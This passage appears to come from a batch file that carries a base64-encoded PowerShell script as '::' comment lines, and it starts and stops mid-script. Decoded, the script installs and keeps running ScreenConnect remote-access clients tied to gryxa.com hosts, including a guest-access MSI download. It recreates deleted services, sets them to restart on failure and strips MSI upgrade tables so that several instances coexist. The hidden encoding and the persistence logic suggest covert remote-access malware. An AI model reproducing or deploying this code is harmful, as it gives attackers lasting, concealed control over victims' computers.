::c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhpdHMg
::dGhlDQogICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24g
::YWx3YXlzIGZlbGwgdGhyb3VnaCB0byAnbm8nDQogICAgIyBhbmQgdGhlIG1vbiBv
::cnBoYW4tbGFkZGVyIGRlbGV0ZWQgaGVhbHRoeSByZWdpc3RlcmVkIHNlcnZpY2Vz
::Lg0KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9DQog
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
::DQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykg
::ew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJv
::b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAg
::ICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlm
::ICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5h
::bWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9DQogICAgICAgIH0NCiAg
::ICB9DQogICAgcmV0dXJuICdubycNCn0NCg0KZnVuY3Rpb24gUmVwYWlyLVNDU2Vy
::dmljZShbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgTDMwOiBORVZFUiBy
::dW4gbXNpZXhlYyAvZmEgb3IgL2kgb24gYSBTY3JlZW5Db25uZWN0IHByb2R1Y3Qg
::4oCUIFNDIGluc3RhbmNlcyBzaGFyZQ0KICAgICMgbGVnYWN5IFVwZ3JhZGVDb2Rl
::cywgc28gYW55IG1zaWV4ZWMgcmVwYWlyL2luc3RhbGwgb24gb25lIEZQIHRyaWdn
::ZXJzIGENCiAgICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCB0aGF0IGtub2NrcyB0
::aGUgR3J5eGEgc2libGluZyBPRkZMSU5FLiBTZXJ2aWNlLWxldmVsIGhlYWwgb25s
::eS4NCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcg
::fQ0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJp
::bnQpIg0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5T
::dGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9DQog
::ICAgaWYgKCRzdmMpIHsNCiAgICAgICAgIyBwcmVzZW50IGJ1dCBzdG9wcGVkIC0+
::IHNlcnZpY2UtbGV2ZWwgc3RhcnQsIG5vIG1zaWV4ZWMNCiAgICAgICAgJiBzYy5l
::eGUgY29uZmlnICIkbmFtZSIgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsDQog
::ICAgICAgICYgc2MuZXhlIGZhaWx1cmUgIiRuYW1lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMC9yZXN0YXJ0LzUwMDAgMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYNCiAg
::ICAgICAgJiBzYy5leGUgc3RhcnQgIiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAg
::ICAgICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5T
::dGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1zdGFydGVkJyB9DQog
::ICAgICAgIHJldHVybiAnc3ZjLXN0aWxsLXN0b3BwZWQtbm9yZXBhaXIobXNpZXhl
::Yy1kaXNhYmxlZCknDQogICAgfQ0KICAgICMgc2VydmljZSBlbnRyeSBnb25lOiBy
::ZS1jcmVhdGUgZnJvbSB0aGUgcmVnaXN0ZXJlZCBwcm9kdWN0J3MgaW5zdGFsbCBk
::aXIgV0lUSE9VVCBtc2lleGVjLg0KICAgICMgSWYgYmluYXJpZXMgZXhpc3QsIHNj
::LmV4ZSBjcmVhdGUgKyBzdGFydC4gRWxzZSByZXBvcnQgc28gY2FsbGVyIGNhbiBk
::ZWNpZGUgKG5ldmVyIC9mYSwgbmV2ZXIgL2kpLg0KICAgICRkaXIgPSAkbnVsbA0K
::ICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::LCAkZW52OlByb2dyYW1GaWxlcykpIHsNCiAgICAgICAgJGNhbmQgPSBKb2luLVBh
::dGggJGJhc2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0K
::ICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRj
::YW5kICdTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJykpIHsgJGRpciA9
::ICRjYW5kOyBicmVhayB9DQogICAgfQ0KICAgIGlmICgtbm90ICRkaXIpIHsgcmV0
::dXJuICdub3QtcmVnaXN0ZXJlZC1ub3JlcGFpcihtc2lleGVjLWRpc2FibGVkKScg
::fQ0KICAgICRleGUgPSBKb2luLVBhdGggJGRpciAnU2NyZWVuQ29ubmVjdC5DbGll
::bnRTZXJ2aWNlLmV4ZScNCiAgICAmIHNjLmV4ZSBjcmVhdGUgIiRuYW1lIiBiaW5Q
::YXRoPSAiYCIkZXhlYCIiIHN0YXJ0PSBhdXRvIERpc3BsYXlOYW1lPSAiJG5hbWUi
::IDI+JjEgfCBPdXQtTnVsbA0KICAgICYgc2MuZXhlIGZhaWx1cmUgIiRuYW1lIiBy
::ZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMC9y
::ZXN0YXJ0LzUwMDAgMj4mMSB8IE91dC1OdWxsDQogICAgJiBzYy5leGUgc3RhcnQg
::IiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25k
::cyA1DQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0
::YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJlY3JlYXRlZC1zdGFy
::dGVkJyB9DQogICAgcmV0dXJuICdzdmMtcmVjcmVhdGVkLW5vdC1ydW5uaW5nJw0K
::fQ0KDQojIOKUgOKUgCBHcnl4YSBTQyB2MiAoY2xlYW4gcmV3cml0ZSkg4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQojIFNpbmds
::ZS1mbGlnaHQgZW5zdXJlLiBSdW5uaW5nID0+IGhlYWx0aHkuIFN0b3BwZWQgc3Zj
::ID0+IHN0YXJ0Lg0KIyBCcm9rZW4vU3R1Y2sgPT4gY2xlYW4tcmVpbnN0YWxsIG9u
::Y2UsIGRldGFjaGVkLiBBYnNlbnQgPT4gaW5zdGFsbCBvbmNlLg0KIyBObyAvZmEs
::IG5vIGlubGluZSBibG9ja2luZyAvaSwgbm8gZmFsc2UgImFscmVhZHlfcnVubmlu
::ZyIuDQokc2NyaXB0OkdyeXhhRGVmYXVsdEZwID0gJzM2ZTUwNmZmMDE2YjIxNTEn
::DQokc2NyaXB0OkdyeXhhTXNpVXJsID0gJ2h0dHBzOi8vdWkuZ3J5eGEuY29tL0Jp
::bi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0
::Jw0KJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA9ICd1cGRhdGUuZ3J5eGEuY29tJw0K
::JHNjcmlwdDpHcnl4YVVpSG9zdCA9ICd1aS5ncnl4YS5jb20nDQokc2NyaXB0OlNl
::dnJ6RGVmYXVsdFByaW1hcnkgPSAnNWY2MDEwNTc5ODUyZTUwNycNCiRzY3JpcHQ6
::U2V2cnpEZWZhdWx0QWx0ID0gJ2Y4NjFjODE0MGQ0NTM0MjcnDQokc2NyaXB0OlNl
::dnJ6S2VlcCA9IEAoJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5LCAkc2NyaXB0
::OlNldnJ6RGVmYXVsdEFsdCkNCiMgU2V0IHRvIGEgMTYtaGV4IEZQIHlvdSBXQU5U
::IGluc3RhbGxlZCAoYWZ0ZXIgcm90YXRpbmcgb24gdGhlIHBhbmVsKS4gQW55IGhv
::c3QNCiMgcnVubmluZyBhIGRpZmZlcmVudCBGUCBtaWdyYXRlcyB0byB0aGlzIG9u
::ZS4gTGVhdmUgJycgdG8ganVzdCB0cmFjayB3aGF0ZXZlciBydW5zLg0KJHNjcmlw
::dDpHcnl4YUV4cGVjdGVkRnAgPSAnMzZlNTA2ZmYwMTZiMjE1MScNCg0KIyBMNDA6
::IFJTQSBwdWJsaWMga2V5IGZvciB1cGRhdGUubWFuaWZlc3QgdmVyaWZpY2F0aW9u
::IChwcml2YXRlIGtleSBpbiBrZXlzLywgZ2l0aWdub3JlZCkNCiRzY3JpcHQ6VXBk
::YXRlUHViS2V5WG1sID0gQCcNCjxSU0FLZXlWYWx1ZT48TW9kdWx1cz50QUJaUG52
::c3Vwb3JpMTltdEpiSG9UMXVGR1ZMTktxT05CMHh0dklCSDRIcGZNNVUrU3RDdUdu
::RWRJeVB5a01RUGpERWxWQlpPZWE4cGRkQnh4UE1JOTRkNFZCcGR3blFlZFdIbG5s
::NkV1UXNKTDJNTWMweG8wZHV6cFFkUFZqRG5lSUl0T3hWTW5sNE1tVFNTOGkxNU9m
::TlRINnlkZGxmaTZ0TmZUdnZDdGt4bEw5YzBxWHh0SW9ZTFFMOWpDMjk0dDJPMHZP
::c0FsaWgwaFM2WEFHcDhPQVRLUi9LVlBwOHFmdzh0enJTdktnWWtwZTc5Yko2N2J0
::ak83cVRIdjFKcFAwNHhlWXRDS2pTRk42WGgwMmRydHF2eXVDSHZ3MSswSFlmdmlh
::SDV5TkFwd29OeC9mNVU2M3VNaWlyS3VKYVpNQnZYTTh1bXh5a0FHcnFkU1UwcFE9
::PTwvTW9kdWx1cz48RXhwb25lbnQ+QVFBQjwvRXhwb25lbnQ+PC9SU0FLZXlWYWx1
::ZT4NCidADQoNCmZ1bmN0aW9uIEdldC1Hcnl4YUNmZ1BhdGggeyBKb2luLVBhdGgg
::JFdvcmtEaXIgJ2dyeXhhLmNmZycgfQ0KZnVuY3Rpb24gR2V0LVNldnJ6Q2ZnUGF0
::aCB7IEpvaW4tUGF0aCAkV29ya0RpciAnc2V2cnouY2ZnJyB9DQoNCmZ1bmN0aW9u
::IEdldC1TZXZyektlZXAgew0KICAgICRwcmltID0gJHNjcmlwdDpTZXZyekRlZmF1
::bHRQcmltYXJ5DQogICAgJGFsdCA9ICRzY3JpcHQ6U2V2cnpEZWZhdWx0QWx0DQog
::ICAgJHAgPSBHZXQtU2V2cnpDZmdQYXRoDQogICAgaWYgKFRlc3QtUGF0aCAtTGl0
::ZXJhbFBhdGggJHApIHsNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRo
::ICRwIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmpl
::Y3Qgew0KICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlBSSU1BUllfRlA9KFsw
::LTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRvTG93
::ZXIoKSB9DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeQUxUX0ZQPShbMC05
::YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGFsdCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIo
::KSB9DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeRVhQRUNURURfUFJJTUFS
::WT0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRwcmltID0gJG1hdGNoZXNbMV0u
::VG9Mb3dlcigpIH0NCiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15FWFBFQ1RF
::RF9BTFQ9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNoZXNb
::MV0uVG9Mb3dlcigpIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkc2NyaXB0OlNl
::dnJ6S2VlcCA9IEAoJHByaW0sICRhbHQpDQogICAgcmV0dXJuIEAoJHByaW0sICRh
::bHQpDQp9DQoNCmZ1bmN0aW9uIFNldC1TZXZyekZwKFtzdHJpbmddJFByaW1hcnks
::IFtzdHJpbmddJEFsdCkgew0KICAgIGlmICgtbm90ICRQcmltYXJ5KSB7ICRQcmlt
::YXJ5ID0gJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5IH0NCiAgICBpZiAoLW5v
::dCAkQWx0KSB7ICRBbHQgPSAkc2NyaXB0OlNldnJ6RGVmYXVsdEFsdCB9DQogICAg
::aWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7IE5l
::dy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIgLUZvcmNl
::IHwgT3V0LU51bGwgfQ0KICAgIEAoDQogICAgICAgICJQUklNQVJZX0ZQPSQoJFBy
::aW1hcnkuVG9Mb3dlcigpKSIsDQogICAgICAgICJBTFRfRlA9JCgkQWx0LlRvTG93
::ZXIoKSkiLA0KICAgICAgICAiRVhQRUNURURfUFJJTUFSWT0kKCRQcmltYXJ5LlRv
::TG93ZXIoKSkiLA0KICAgICAgICAiRVhQRUNURURfQUxUPSQoJEFsdC5Ub0xvd2Vy
::KCkpIiwNCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRvVW5pdmVyc2Fs
::VGltZSgpLlRvU3RyaW5nKCdvJykpIg0KICAgICkgfCBTZXQtQ29udGVudCAtTGl0
::ZXJhbFBhdGggKEdldC1TZXZyekNmZ1BhdGgpIC1FbmNvZGluZyBBU0NJSSAtRm9y
::Y2UNCiAgICAkc2NyaXB0OlNldnJ6S2VlcCA9IEAoJFByaW1hcnkuVG9Mb3dlcigp
::LCAkQWx0LlRvTG93ZXIoKSkNCn0NCg0KZnVuY3Rpb24gU3luYy1TZXZyekV4cGVj
::dGVkKFtzdHJpbmddJEV4cGVjdGVkVGV4dCkgew0KICAgICMgQXBwbHkgcmVwbyBz
::ZXZyel9leHBlY3RlZC5jZmcgYm9keSAoRVhQRUNURURfUFJJTUFSWT0vRVhQRUNU
::RURfQUxUPSBsaW5lcykNCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwN
::CiAgICBmb3JlYWNoICgkbGluZSBpbiAoJEV4cGVjdGVkVGV4dCAtc3BsaXQgImBy
::P2BuIikpIHsNCiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXkVYUEVDVEVEX1BS
::SU1BUlk9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVz
::WzFdLlRvTG93ZXIoKSB9DQogICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15FWFBF
::Q1RFRF9BTFQ9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNo
::ZXNbMV0uVG9Mb3dlcigpIH0NCiAgICB9DQogICAgaWYgKC1ub3QgJHByaW0pIHsg
::JHByaW0gPSAoR2V0LVNldnJ6S2VlcClbMF0gfQ0KICAgIGlmICgtbm90ICRhbHQp
::IHsgJGFsdCA9IChHZXQtU2V2cnpLZWVwKVsxXSB9DQogICAgU2V0LVNldnJ6RnAg
::JHByaW0gJGFsdA0KICAgIHJldHVybiAiU0VWUlp8JHByaW18JGFsdCINCn0NCg0K
::ZnVuY3Rpb24gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZShbc3RyaW5nXSRNc2lQYXRo
::KSB7DQogICAgIyBMNDAvTDQ0OiBjb3B5IE1TSSBhbmQgREVMRVRFIEZST00gVXBn
::cmFkZSBzbyAvaSBjYW5ub3QgUmVtb3ZlRXhpc3RpbmdQcm9kdWN0cyBzaWJsaW5n
::cy4NCiAgICAjIEw0NDogdmVyaWZ5IFVwZ3JhZGUgaXMgZW1wdHkgYWZ0ZXIgREVM
::RVRFIOKAlCBuZXZlciByZXR1cm4gYSBzdGlsbC1kYW5nZXJvdXMgTVNJLg0KICAg
::IGlmICgtbm90ICRNc2lQYXRoIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQ
::YXRoICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgICRzYWZlID0gSm9p
::bi1QYXRoICRlbnY6VEVNUCAoInNjX3NhZmVfezB9Lm1zaSIgLWYgW2d1aWRdOjpO
::ZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkNCiAgICB0cnkgew0KICAgICAgICBDb3B5
::LUl0ZW0gLUxpdGVyYWxQYXRoICRNc2lQYXRoIC1EZXN0aW5hdGlvbiAkc2FmZSAt
::Rm9yY2UNCiAgICAgICAgJGkgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93
::c0luc3RhbGxlci5JbnN0YWxsZXINCiAgICAgICAgJGRiID0gJGkuT3BlbkRhdGFi
::YXNlKChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRzYWZlKS5QYXRoLCAxKQ0K
::ICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHYgPSAkZGIuT3BlblZpZXcoJ0RF
::TEVURSBGUk9NIGBVcGdyYWRlYCcpDQogICAgICAgICAgICAkdi5FeGVjdXRlKCkg
::fCBPdXQtTnVsbA0KICAgICAgICAgICAgJGRiLkNvbW1pdCgpDQogICAgICAgIH0g
::Y2F0Y2ggew0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRz
::YWZlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAg
::ICAgICAgcmV0dXJuICRudWxsDQogICAgICAgIH0NCiAgICAgICAgIyB2ZXJpZnkg
::ZW1wdHkNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRkYjIgPSAkaS5PcGVu
::RGF0YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJHNhZmUpLlBhdGgs
::IDApDQogICAgICAgICAgICAkYyA9ICRkYjIuT3BlblZpZXcoJ1NFTEVDVCBgVXBn
::cmFkZUNvZGVgIEZST00gYFVwZ3JhZGVgJykNCiAgICAgICAgICAgICRjLkV4ZWN1
::dGUoKSB8IE91dC1OdWxsDQogICAgICAgICAgICBpZiAoJGMuRmV0Y2goKSkgew0K
::ICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkc2FmZSAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAg
::ICAgICByZXR1cm4gJG51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRj
::aCB7DQogICAgICAgICAgICAjIG1pc3NpbmcgVXBncmFkZSB0YWJsZSA9IGFscmVh
::ZHkgc2FmZQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkc2FmZQ0KICAgIH0g
::Y2F0Y2ggew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkc2Fm
::ZSkgeyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHNhZmUgLUZvcmNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgcmV0dXJuICRudWxs
::DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVVwZGF0ZU1hbmlmZXN0KFtzdHJp
::bmddJE1hbmlmZXN0UGF0aCwgW3N0cmluZ10kU2lnUGF0aCwgW2hhc2h0YWJsZV0k
::RmlsZU1hcCkgew0KICAgICMgVmVyaWZ5IFJTQS1TSEEyNTYgc2lnbmF0dXJlIG92
::ZXIgdXBkYXRlLm1hbmlmZXN0LCB0aGVuIFNIQTI1NiBvZiBlYWNoIHN0YWdlZCBm
::aWxlLg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNYW5p
::ZmVzdFBhdGgpIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRTaWdQ
::YXRoKSkgeyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBpZiAoLW5vdCAkc2NyaXB0
::OlVwZGF0ZVB1YktleVhtbCAtb3IgJHNjcmlwdDpVcGRhdGVQdWJLZXlYbWwgLW1h
::dGNoICdQTEFDRUhPTERFUicpIHsgcmV0dXJuICduby1wdWJrZXknIH0NCiAgICB0
::cnkgew0KICAgICAgICAkYnl0ZXMgPSBbSU8uRmlsZV06OlJlYWRBbGxCeXRlcygo
::UmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTWFuaWZlc3RQYXRoKS5QYXRoKQ0K
::ICAgICAgICAkc2lnID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChbSU8u
::RmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRT
::aWdQYXRoKS5QYXRoKS5UcmltKCkpKQ0KICAgICAgICAkcnNhID0gW1N5c3RlbS5T
::ZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBXTo6Q3JlYXRlKCkNCiAgICAgICAgJHJz
::YS5Gcm9tWG1sU3RyaW5nKCRzY3JpcHQ6VXBkYXRlUHViS2V5WG1sKQ0KICAgICAg
::ICBpZiAoLW5vdCAkcnNhLlZlcmlmeURhdGEoJGJ5dGVzLCAkc2lnLCBbU3lzdGVt
::LlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1
::NiwgW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBU2lnbmF0dXJlUGFk
::ZGluZ106OlBrY3MxKSkgew0KICAgICAgICAgICAgcmV0dXJuICdiYWQtc2lnJw0K
::ICAgICAgICB9DQogICAgICAgICRkb2MgPSBHZXQtQ29udGVudCAtTGl0ZXJhbFBh
::dGggJE1hbmlmZXN0UGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KICAgICAg
::ICBmb3JlYWNoICgkbmFtZSBpbiAkRmlsZU1hcC5LZXlzKSB7DQogICAgICAgICAg
::ICAkcGF0aCA9ICRGaWxlTWFwWyRuYW1lXQ0KICAgICAgICAgICAgaWYgKC1ub3Qg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHBhdGgpKSB7IHJldHVybiAibWlzc2lu
::Zy1maWxlOiRuYW1lIiB9DQogICAgICAgICAgICAkd2FudCA9IFtzdHJpbmddJGRv
::Yy5maWxlcy4kbmFtZQ0KICAgICAgICAgICAgaWYgKC1ub3QgJHdhbnQpIHsgcmV0
::dXJuICJub3QtaW4tbWFuaWZlc3Q6JG5hbWUiIH0NCiAgICAgICAgICAgICRzaGEg
::PSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUo
::KQ0KICAgICAgICAgICAgJGZzID0gW0lPLkZpbGVdOjpPcGVuUmVhZCgoUmVzb2x2
::ZS1QYXRoIC1MaXRlcmFsUGF0aCAkcGF0aCkuUGF0aCkNCiAgICAgICAgICAgIHRy
::eSB7ICRoYXNoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkc2hhLkNvbXB1
::dGVIYXNoKCRmcykpKS5SZXBsYWNlKCctJywgJycpLlRvTG93ZXIoKSB9DQogICAg
::ICAgICAgICBmaW5hbGx5IHsgJGZzLkNsb3NlKCkgfQ0KICAgICAgICAgICAgaWYg
::KCRoYXNoIC1uZSAkd2FudC5Ub0xvd2VyKCkpIHsgcmV0dXJuICJoYXNoLW1pc21h
::dGNoOiRuYW1lIiB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICdvaycNCiAg
::ICB9IGNhdGNoIHsgcmV0dXJuICJlcnJvcjokKCRfLkV4Y2VwdGlvbi5NZXNzYWdl
::KSIgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFGcCB7DQogICAgJGZwID0gJHNj
::cmlwdDpHcnl4YURlZmF1bHRGcA0KICAgICRwID0gR2V0LUdyeXhhQ2ZnUGF0aA0K
::ICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSB7DQogICAgICAgIEdl
::dC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgkXyAt
::bWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZw
::ID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0NCiAgICAgICAgfQ0KICAgIH0NCiAg
::ICByZXR1cm4gJGZwDQp9DQoNCmZ1bmN0aW9uIFNldC1Hcnl4YUZwKFtzdHJpbmdd
::JEZpbmdlcnByaW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJl
::dHVybiB9DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdv
::cmtEaXIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdv
::cmtEaXIgLUZvcmNlIHwgT3V0LU51bGwgfQ0KICAgIEAoDQogICAgICAgICJDVVJS
::RU5UX0ZQPSQoJEZpbmdlcnByaW50LlRvTG93ZXIoKSkiLA0KICAgICAgICAiUkVM
::QVk9JCgkc2NyaXB0OkdyeXhhUmVsYXlIb3N0KSIsDQogICAgICAgICJVST0kKCRz
::Y3JpcHQ6R3J5eGFVaUhvc3QpIiwNCiAgICAgICAgIk1TSVVSTD0kKCRzY3JpcHQ6
::R3J5eGFNc2lVcmwpIiwNCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRv
::VW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykpIg0KICAgICkgfCBTZXQtQ29u
::dGVudCAtTGl0ZXJhbFBhdGggKEdldC1Hcnl4YUNmZ1BhdGgpIC1FbmNvZGluZyBB
::U0NJSSAtRm9yY2UNCn0NCg0KIyBMMzk6IG5ldmVyIGFkb3B0IGEgZm9yZWlnbiBT
::QyBhcyBHcnl4YS4gS2VlcGVyIG9ubHkgaWYgRlAgaXMgRXhwZWN0ZWRGcCBPUg0K
::IyBJbWFnZVBhdGgvY21kbGluZSBjb250YWlucyBncnl4YS5jb20gKG9yIGNmZyBS
::RUxBWSBob3N0KS4gRG8gTk9UIHRydXN0IGNmZyBhbG9uZSDigJQNCiMgYSBwb2lz
::b25lZCBDVVJSRU5UX0ZQIHdvdWxkIHNlbGYtd2hpdGVsaXN0IGZvcmV2ZXIuDQpm
::dW5jdGlvbiBUZXN0LUlzR3J5eGFGcChbc3RyaW5nXSRGcCkgew0KICAgIGlmICgt
::bm90ICRGcCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAkZnAgPSAkRnAuVG9Mb3dl
::cigpDQogICAgaWYgKCRmcCAtaW4gJHNjcmlwdDpTZXZyektlZXApIHsgcmV0dXJu
::ICRmYWxzZSB9DQogICAgaWYgKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwIC1hbmQg
::JGZwIC1lcSAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcC5Ub0xvd2VyKCkpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JGZwKSINCiAgICAkaW1nID0gW3N0cmluZ10oR2V0LUl0ZW1Qcm9wZXJ0eSAiSEtM
::TTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXCRuYW1lIiAtRXJy
